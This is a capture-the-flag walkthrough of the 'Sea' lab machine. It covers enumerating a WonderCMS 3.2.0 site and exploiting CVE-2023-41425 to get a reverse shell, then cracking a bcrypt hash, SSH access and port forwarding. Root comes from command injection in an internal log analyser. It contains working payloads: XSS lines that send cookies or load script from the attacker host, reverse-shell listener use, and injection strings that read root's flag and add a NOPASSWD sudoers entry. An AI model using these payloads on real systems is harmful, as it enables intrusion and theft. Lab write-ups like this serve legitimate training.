
## Intro



Tags: #linux #WebApp #XSS #PortForwarding #commandinjection #OSCPpath #easy

------------

# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.21.36 sea.htb' | sudo tee -a /etc/hosts
```
## Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  sea.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 09:17 -0400
Nmap scan report for sea.htb (10.129.21.36)
Host is up (0.060s latency).
Not shown: 65403 closed tcp ports (reset), 130 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A sea.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 09:19 -0400
Nmap scan report for sea.htb (10.129.21.36)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   46.16 ms 10.10.14.1
2   47.30 ms sea.htb (10.129.21.36)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds
```

### WebApp

```
http://sea.htb/
```
![](MediaFiles/Pasted%20image%2020260613162016.png)

![](MediaFiles/Pasted%20image%2020260613162047.png)

![](MediaFiles/Pasted%20image%2020260613162213.png)


```
http://sea.htb/contact.php
```
![](MediaFiles/Pasted%20image%2020260613162224.png)

## page source

revealed nothing interesting

## SQLi attempt
```shell
" or ""="
```
but did not work, form submitted successfully with no luck

## XSS attempt

```shell
<img src=x onerror=fetch('http://10.10.14.148:9001/?c='+btoa(document.cookie))>
```

```shell
"><img src=x onerror=fetch('http://10.10.14.148:9001/?c='+btoa(document.cookie))>
```
none of these worked, but wait a minute, the form literally has a field called website, lets try putting our url there
![](MediaFiles/Pasted%20image%2020260613162938.png)
```shell
└─$ python3 -m http.server 9001                                                                                                               
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.21.36 - - [13/Jun/2026 09:29:48] "GET / HTTP/1.1" 200 -
```
okay and we got a response back, so this one works, but we need to find a way to leak the cookie this way, so lets try again with this:
![](MediaFiles/Pasted%20image%2020260613163540.png)
we see it was successfully downloaded
```shell
└─$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.21.36 - - [13/Jun/2026 09:35:50] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```
but could not call it via browser.. hm i might need to do more enum

### Directory enumeration

```shell
dirsearch -u http://sea.htb/ -x 403,404
```

```shell

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ch3ckm8/Desktop/reports/http_sea.htb/__26-06-13_09-48-39.txt

Target: http://sea.htb/

[09:48:39] Starting:                                                                                                                          
[09:48:47] 200 -    1KB - /404                                              
[09:49:02] 200 -  939B  - /contact.php                                      
[09:49:03] 301 -  228B  - /data  ->  http://sea.htb/data/                   
[09:49:13] 301 -  232B  - /messages  ->  http://sea.htb/messages/           
[09:49:18] 301 -  231B  - /plugins  ->  http://sea.htb/plugins/             
[09:49:26] 301 -  230B  - /themes  ->  http://sea.htb/themes/               
Task Completed   
```

### Enumerate specific directories

if u dont have seclists install easily on kali
```shell
sudo apt install seclists
```

```shell
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "http://sea.htb/themes/FUZZ" -t 200
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Reports List            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
external files          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 101ms]
Style Library           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 97ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 8974ms]
modern mom              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 65ms]
neuf giga photo         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 200ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 4741ms]
Web References          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 72ms]
My Project              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 230ms]
bike                    [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 152ms]
Contact Us              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 173ms]
Donate Cash             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 186ms]
Home Page               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 71ms]
Privacy Policy          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 241ms]
Planned Giving          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 255ms]
Press Releases          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 268ms]
Site Map                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 199ms]
About Us                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 213ms]
Bequest Gift            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 185ms]
Gift Form               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 124ms]
Life Income Gift        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 107ms]
New Folder              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 119ms]
Site Assets             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 146ms]
What is New             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 103ms]
:: Progress: [29999/29999] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:49] :: Errors: 1 ::
```
found `bike`, lets fuzz its contents too
```shell
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 50ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 249ms]
Reports List            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 280ms]
external files          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 215ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 397ms]
Style Library           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 204ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 184ms]
modern mom              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 157ms]
neuf giga photo         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 61ms]
img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 109ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 349ms]
Web References          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 167ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 283ms]
My Project              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 167ms]
Contact Us              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 583ms]
Donate Cash             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 223ms]
Home Page               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 80ms]
Planned Giving          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 148ms]
Press Releases          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 143ms]
Privacy Policy          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 143ms]
Site Map                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 409ms]
About Us                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 247ms]
Bequest Gift            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 210ms]
Gift Form               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 171ms]
Life Income Gift        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 339ms]
New Folder              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 159ms]
Site Assets             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 103ms]
What is New             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 147ms]
:: Progress: [29999/29999] :: Job [1/1] :: 154 req/sec :: Duration: [0:01:00] :: Errors: 10 ::
```

lets investigate the ones that returned 200 http code:
![](MediaFiles/Pasted%20image%2020260613165444.png)
![](MediaFiles/Pasted%20image%2020260613165514.png)
okay it gives us a version but a version of what? lets enumerate more

lets enumerate also with a wordlist suitable for files
```shell
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u "http://sea.htb/themes/bike/FUZZ" -e .txt,.md,.php,.html -t 200
```
great, found a readme file too
```shell
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 159ms]
```
lets navigate to see its content
![](MediaFiles/Pasted%20image%2020260613170015.png)
nice! the exact information we were looking for! so all in all we have 
`wonderCMS 3.2.0`

------------
# Foothold

lets try finding exploits for it, found this
* we can combine the SSRF injection in the contact form with the CVE-2023-41425 exploit, such that the logged in user clicks on the malicious XSS script, and we get RCE:

found multiple exploits, this one worked for me:

download [the exploit](https://github.com/Tea-On/CVE-2023-41425-RCE-WonderCMS-4.3.2/blob/main/exploit_CVE-2023-41425.py) and [the reverse shell file](https://github.com/Tea-On/CVE-2023-41425-RCE-WonderCMS-4.3.2/blob/main/reverseShell.php) from the repo

run the exploit script:
```shell
python3 exploit_CVE-2023-41425.py -u http://sea.htb/loginURL -H 10.10.14.148 -p 4444 -r reverseShell.php
```

the exploit starts the Python HTTP server on port 3000 and provides the XSS payload - ```http://sea.htb/index.php?page=loginURL?"><script src="http://10.10.14.95:3000/script.js"></script>```

 start a listener using ```nc -nvlp 4444```

submit the XSS payload in the contact form's website field, and within a moment, the script and revshell files are fetched, and we get reverse shell

after a few seconds:
```shell
└─$ python3 exploit_CVE-2023-41425.py -u http://sea.htb/loginURL -H 10.10.14.148 -p 4444 -r reverseShell.php                                  
[+] Using parameters:
    Login URL: http://sea.htb/loginURL
    Listener IP: 10.10.14.148
    Listener Port: 4444
    Directory Name: TeaOn
    ZIP Base Name: reverse-shell
    PHP Source: /home/ch3ckm8/Downloads/reverseShell.php

[+] Updated PHP reverse shell in '/home/ch3ckm8/Downloads/reverseShell.php'.
[+] Created ZIP archive 'reverse-shell.zip'.
[+] Created 'script.js'.
[+] Start your listener:
    nc -lnvp 4444

[+] Deliver this XSS payload URL to the admin:
    http://sea.htb/index.php?page=loginURL?"><script src="http://10.10.14.148:3000/script.js"></script>

[+] HTTP server serving files on port 3000

[+] HTTP server at http://0.0.0.0:3000/
10.129.21.36 - - [13/Jun/2026 10:25:36] "GET /script.js HTTP/1.1" 200 -
10.129.21.36 - - [13/Jun/2026 10:25:46] "GET /reverse-shell.zip HTTP/1.1" 200 -
10.129.21.36 - - [13/Jun/2026 10:25:46] "GET /reverse-shell.zip HTTP/1.1" 200 -
10.129.21.36 - - [13/Jun/2026 10:25:46] "GET /reverse-shell.zip HTTP/1.1" 200 -
10.129.21.36 - - [13/Jun/2026 10:25:46] "GET /reverse-shell.zip HTTP/1.1" 200 -
```
got shell back

## Shell as www-data
```shell
└─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.21.36] 53582
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 14:25:46 up  1:13,  0 users,  load average: 1.00, 1.11, 2.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami     
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sea:/$ 
```

```shell
www-data@sea:/home$ ls
ls
amay  geo
```
found user flag but cant display it
```shell
www-data@sea:/home/amay$ ls 
ls
user.txt
www-data@sea:/home/amay$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@sea:/home/amay$ ls -la
ls -la
total 32
drwxr-xr-x 4 amay amay 4096 Aug  1  2024 .
drwxr-xr-x 4 root root 4096 Jul 30  2024 ..
lrwxrwxrwx 1 root root    9 Aug  1  2024 .bash_history -> /dev/null
-rw-r--r-- 1 amay amay  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 amay amay 3771 Feb 25  2020 .bashrc
drwx------ 2 amay amay 4096 Aug  1  2024 .cache
-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
drwx------ 2 amay amay 4096 Feb 21  2024 .ssh
-rw-r----- 1 root amay   33 Jun 13 13:13 user.txt

```

### Filesystem enum
#### check website's content /var/www

```shell
www-data@sea:/var/www/sea/data$ cat database.js
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2026\/06\/13 14:30:06": "127.0.0.1",
            "2026\/06\/13 14:25:35": "127.0.0.1",
            "2026\/06\/13 14:21:25": "127.0.0.1",
            "2026\/06\/13 14:19:15": "127.0.0.1",
            "2026\/06\/13 14:15:05": "127.0.0.1"
        },
        "lastModulesSync": "2026\/06\/13",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
```
#### hash obtained

```shell
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```
remove the `\`, it becomes:
```shell
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```
### Cracking hash

lets crack with hashcat
```shell
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
or with john
```shell
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)     
1g 0:00:00:16 DONE (2026-06-13 10:40) 0.06191g/s 189.4p/s 189.4c/s 189.4C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
crack successfull
#### creds obtained
```shell
amay or geo
mychemicalromance
```

## Shell as amay

login via ssh and grab user flag
```shell
ssh amay@sea.htb                                                  
The authenticity of host 'sea.htb (10.129.21.36)' can't be established.
ED25519 key fingerprint is: SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 13 Jun 2026 02:41:35 PM UTC

  System load:  1.3               Processes:             252
  Usage of /:   64.2% of 6.51GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.21.36
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40
amay@sea:~$ whoami
amay
amay@sea:~$ cat user.txt
4b7732a5ead9f7aaa74361487e77862e
```

----------
# Privesc

### sudo -l

```shell
amay@sea:~$ sudo -l
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea.
```
failed

### listening ports

```shell
amay@sea:~$ ss -tuln
Netid         State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port         Process         
udp           UNCONN         0              0                      127.0.0.53%lo:53                         0.0.0.0:*                            
udp           UNCONN         0              0                            0.0.0.0:68                         0.0.0.0:*                            
tcp           LISTEN         0              10                         127.0.0.1:39175                      0.0.0.0:*                            
tcp           LISTEN         0              511                          0.0.0.0:80                         0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:8080                       0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:53                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:22                         0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:22                            [::]:* 
```
lets check some of those:
```shell
amay@sea:~$ nc -zv 127.0.0.1 39175
Connection to 127.0.0.1 39175 port [tcp/*] succeeded!
amay@sea:~$ ss -tulnp | grep :39175
tcp    LISTEN  0       10           127.0.0.1:39175        0.0.0.0:*            
amay@sea:~$ curl http://127.0.0.1:8080
Unauthorized accessamay@sea:~$ 
```
lets see if we can print more info about them:
```shell
amay@sea:~$ ss -tulnp -e
Netid      State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process                           
udp        UNCONN       0            0                  127.0.0.53%lo:53                     0.0.0.0:*          uid:101 ino:26710 sk:1 <->       
udp        UNCONN       0            0                        0.0.0.0:68                     0.0.0.0:*          ino:22175 sk:2 <->               
tcp        LISTEN       0            10                     127.0.0.1:39175                  0.0.0.0:*          uid:1001 ino:30114 sk:3 <->      
tcp        LISTEN       0            511                      0.0.0.0:80                     0.0.0.0:*          ino:27530 sk:4 <->               
tcp        LISTEN       0            4096                   127.0.0.1:8080                   0.0.0.0:*          ino:25393 sk:5 <->               
tcp        LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*          uid:101 ino:26711 sk:6 <->       
tcp        LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*          ino:27512 sk:7 <->               
tcp        LISTEN       0            128                         [::]:22                        [::]:*          ino:27514 sk:8 v6only:1 <-> 
```
okay, since its not clear lets try port forwarding some of those and inspect them, first i tried `8080`

### Port forward port 8080

```
ssh -L 8888:localhost:8080 amay@sea.htb
```
interesting, navigating there locally to the port forwarded port 8080 goes to a page with a login popup
### WebApp
![](MediaFiles/Pasted%20image%2020260613174912.png)
using amay's creds, we are then logged in, and redirected here:
![](MediaFiles/Pasted%20image%2020260613174945.png)
we can analyze/view the logs at the bottom
i clicked on clear ath and access log, and then tried to analyze, and was shown these:
![](MediaFiles/Pasted%20image%2020260613175204.png)
`No suspicious traffic patterns detected in /var/log/apache2/access.log.`

#### Inspect requests with Burp

Using Burp checking the 'analyze log file' option, 
```
POST / HTTP/1.1

Host: localhost:8888

Content-Length: 57

Cache-Control: max-age=0

Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==

sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Accept-Language: en-US,en;q=0.9

Origin: http://localhost:8888

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: http://localhost:8888/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

if we use it to analyze the file 'access.log' for example, Burp Suite shows that it uses a POST request with the data `log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=';` the webpage then prints the contents of the log file, and also detects suspicious traffic patterns

* the 'log_file' parameter uses the URL-encoded path ```/var/log/apache2/access.log```

* we can test for command injection points here, as it is very likely a command is being executed to read the log files - test for the following characters, and their URL-encoded forms:

#### Command injection

After some testing, simple ; for command injection adding some separators will make the dummy filter totally misfunction to output sensitive files owned by root and execute arbitrary commands:

if we check for command injection using semicolon (```;```) in the POST request data, we are able to get command execution using the following injection:

### leak root flag
```shell
log_file=/root/root.txt;id;sth&analyze_log=/root/root.txt
```
![](MediaFiles/Pasted%20image%2020260613175853.png)
```shell
</form>
282f74f589966cc962824449b49ffbd4
uid=0(root) gid=0(root) groups=0(root)
<p class='error'>Suspicious traffic patterns detected in /root/root.txt;id;sth:</p><pre>
```
works! found root flag, but lets get shell too to gain complete control of the system.

### Add amay to sudoers

lets add amay to sudoers
```shell
log_file=/etc/passwd%26%26echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#&analyze_log=
```
![](MediaFiles/Pasted%20image%2020260613180651.png)

## Shell as root

since amay is now on sudoers:
```shell
amay@sea:~$ sudo su -
root@sea:~# cat root.txt
282f74f589966cc962824449b49ffbd4
root@sea:~# 
```

---
# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

todo -> wyrmgaze

---
# Sidenotes

